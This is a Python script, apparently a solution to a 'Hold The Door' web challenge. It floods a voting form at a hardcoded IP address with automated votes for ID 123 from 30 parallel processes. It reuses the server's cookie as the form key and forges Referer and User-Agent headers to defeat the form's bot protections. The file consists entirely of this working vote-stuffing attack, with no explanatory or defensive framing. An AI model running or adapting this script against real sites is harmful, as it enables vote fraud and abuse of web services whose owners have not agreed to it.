#!/usr/bin/python3
"""
app to continually add input to form with requests python lib
"""
import requests
import multiprocessing

URL = 'http://54.221.6.249/level2.php'
URL = 'http://54.221.6.249/level2.php'
HEADERS = {'content-type': 'application/x-www-form-urlencoded',
           'Referer': 'http://54.221.6.249/level2.php',
           'User-Agent': ('Mozilla/5.0 (Windows NT 10.0; <64-bit tags>) AppleWe'
                          'bKit/<WebKit Rev> (KHTML, like Gecko) Chrome/<Chrome'
                          'Rev> Safari/<WebKit Rev> Edge/<EdgeHTML Rev>.<Window'
                          's Build>')
           }
DATA = {
    'id': '123',
    'holdthedoor': 'submit',
    'key': ''
    }
COOKIES = {
    'HoldTheDoor': ''
    }
ID = '<td>\n123    </td>'
VOTES = 0


def count_votes(htmlstring):
    global VOTES
    for i in range(len(htmlstring)):
        if htmlstring[i:(i + len(ID))] == ID:
            VOTES = int(htmlstring[(i + 27):(i + 32)])
            break


def vote(end):
    global VOTES
    global DATA
    global COOKIES
    r = requests.get(URL)
    count_votes(r.text)
    while VOTES < end:
        DATA['key'] = COOKIES['HoldTheDoor'] = r.cookies['HoldTheDoor']
        r = requests.post(URL, data=DATA, headers=HEADERS, cookies=COOKIES)
        count_votes(r.text)


def start_process():
    end = 950
    p = multiprocessing.Process(target=vote, args=(end,))
    return p


def app():
    running = []
    for i in range(30):
        running.append(start_process())
        running[i].start()
    for i in running:
        i.join()
    vote(1024)
    print('************************')
    print('Votes = {:d} for ID: {:}'.format(VOTES, ID[5:8]))
    print('************************')

if __name__ == '__main__':
    app()
